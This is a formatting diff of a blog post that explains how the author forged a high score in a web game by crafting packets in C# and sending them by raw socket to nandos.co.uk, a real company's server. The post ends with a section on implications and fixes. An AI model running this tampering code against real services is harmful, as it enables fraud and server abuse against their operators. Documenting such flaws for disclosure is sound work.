@@ -124,11 +124,11 @@ about our score?
 I can't remember my original score. However, below are the last line of bytes captured from the packet from the
 above capture and two new captures:
 
-{% highlight plain linenos %}
+<pre class="brush: plain">
     00 40 82 68 00 00 00 00 00 = unknown - old capture
     00 40 85 88 00 00 00 00 00 = 689
     00 40 88 00 00 00 00 00 00 = 768
-{% endhighlight %}
+</pre>
 
 This area is most likely our score since 00 indicates a number, and from trial and error I was able to confirm it
 by changing the two bytes after 00 to random hex values - which led to a new high-score of 38 million:
@@ -156,7 +156,7 @@ arrays - we'll need to split it up further later-on as well. I combined the byte
 since it provides a <a href="http://msdn.microsoft.com/en-us/library/x303t819.aspx">ToArray</a> method; therefore
 you could do e.g.:
 
-{% highlight c# linenos %}
+<pre class="brush: csharp">
     int[] peer0 = new int[]{ 0x00, 0x02 };
     int[] peer1 = new int[]{ 0x04, 0x05 };
     List<byte> payload = new List<byte>();
@@ -169,21 +169,21 @@ you could do e.g.:
        for (int i = 0; i < intarray.Length; i++)
            bytes.Add((byte)intarray[i]);
     }
-{% endhighlight %}
+</pre>
 
 Next we'll need to send our payload; we can do this by importing <b>System.Net.Sockets</b> and using:
 
-{% highlight c# linenos %}
+<pre class="brush: csharp">
     Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
     sock.Connect("nandos.co.uk", 80);
     sock.Send(
         payloadCompiled
         );
-{% endhighlight %}
+</pre>
 
 Then we'll want to read the response from the server, to check our payload has been sent successfully:
 
-{% highlight c# linenos %}
+<pre class="brush: csharp">
     int mainBufferSize = 819200; // The desired size of the buffer 800 kb 
     byte[] mainBuffer = new byte[mainBufferSize]; // The buffer to store the response from the target
     byte[] buff = new byte[4096]; // Temporary buffer to receive small chunks at a time
@@ -208,7 +208,7 @@ Then we'll want to read the response from the server, to check our payload has b
     System.Diagnostics.Debug.WriteLine(
         System.Text.Encoding.UTF8.GetString(mainBuffer)
         );
-{% endhighlight %}
+</pre>
 
 Now you should be able to run your program, deliver your payload and get a response from the target; I recommend
 you run Wireshark to check your data is being sent correctly.
@@ -223,7 +223,7 @@ step 1, each piece of data had three bytes before it:
 
 For forename you could do:
 
-{% highlight c# linenos %}
+<pre class="brush: csharp">
     string forename = "Johnny";
     int [] peer0_3 = new int[] { 0x02, 0x00, (forename.Length)};
     addInts(ref payload, ref peer0_3);
@@ -234,12 +234,12 @@ For forename you could do:
                 foreach (char c in data)
                     bytes.Add((byte)((int)c));
             }
-{% endhighlight %}
+</pre>
 
 <b>You'll also need to modify the content-length of the packet</b>; here is my complete program, demonstrating how
 to do that and all of the above:
 
-{% highlight c# linenos %}
+<pre class="brush: csharp">
     namespace johnny_derp
     {
         class Program
@@ -539,7 +539,7 @@ to do that and all of the above:
             }
         }
     }
-{% endhighlight %}
+</pre>
 
 # Implications &amp; Resolutions
 Such an attack could be used in a DDOS attack to put heavy strain on both the database and web server; plus if the
